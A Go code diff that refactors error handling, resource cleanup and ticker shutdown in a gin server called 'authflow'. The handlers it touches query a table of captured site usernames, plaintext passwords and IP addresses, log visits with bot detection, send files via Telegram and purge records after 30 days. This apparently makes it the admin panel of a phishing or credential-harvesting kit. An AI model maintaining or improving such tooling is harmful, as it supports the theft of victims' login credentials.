@@ -374,7 +374,8 @@ func healthCheck(c *gin.Context) {
 
 func dashboardHandler(c *gin.Context) {
 	c.Header("Content-Type", "text/html; charset=utf-8")
-	template.Must(template.New("dashboard").Parse(dashboardHTML)).Execute(c.Writer, gin.H{"domain": config.Domain, "version": "2.0.0", "goVersion": runtime.Version()})
+	tmpl, _ := template.New("dashboard").Parse(dashboardHTML)
+	tmpl.Execute(c.Writer, gin.H{"domain": config.Domain, "version": "2.0.0", "goVersion": runtime.Version()})
 }
 
 func dashboardDataHandler(c *gin.Context) {
@@ -400,7 +401,13 @@ func dashboardDataHandler(c *gin.Context) {
 }
 
 func sessionsHandler(c *gin.Context) {
-	rows, _ := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`)
+	rows, err := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`)
+	if err != nil {
+		c.JSON(500, gin.H{"error": err.Error()})
+		return
+	}
+	defer rows.Close()
+
 	var sessions []map[string]interface{}
 	for rows.Next() {
 		var id, site, user, pass, ip, created string; var comp int
@@ -411,7 +418,13 @@ func sessionsHandler(c *gin.Context) {
 }
 
 func visitsHandler(c *gin.Context) {
-	rows, _ := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`)
+	rows, err := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`)
+	if err != nil {
+		c.JSON(500, gin.H{"error": err.Error()})
+		return
+	}
+	defer rows.Close()
+
 	var visits []map[string]interface{}
 	for rows.Next() {
 		var created, site, ip, bot, ref string; var isB int
@@ -427,7 +440,10 @@ func logsHandler(c *gin.Context) {
 }
 
 func restartHandler(c *gin.Context) {
-	go func() { time.Sleep(1 * time.Second); exec.Command("systemctl", "restart", "authflow").Run() }()
+	go func() {
+		time.Sleep(1 * time.Second)
+		exec.Command("systemctl", "restart", "authflow").Run()
+	}()
 	c.JSON(200, gin.H{"success": true})
 }
 
@@ -459,7 +475,9 @@ func sendTelegramFile(name, content, caption string) {
 }
 
 func runRateLimitCleanup() {
-	for range time.NewTicker(10 * time.Minute).C {
+	ticker := time.NewTicker(10 * time.Minute)
+	defer ticker.Stop()
+	for range ticker.C {
 		now := time.Now()
 		ipRateLimiters.Range(func(key, value interface{}) bool {
 			if now.Sub(time.Unix(value.(*limiterEntry).lastSeen.Load(), 0)) > 15*time.Minute { ipRateLimiters.Delete(key) }
@@ -469,7 +487,9 @@ func runRateLimitCleanup() {
 }
 
 func runCleanupTicker() {
-	for range time.NewTicker(24 * time.Hour).C {
+	ticker := time.NewTicker(24 * time.Hour)
+	defer ticker.Stop()
+	for range ticker.C {
 		cutoff := time.Now().AddDate(0, 0, -30).Format(time.RFC3339)
 		db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
 		db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
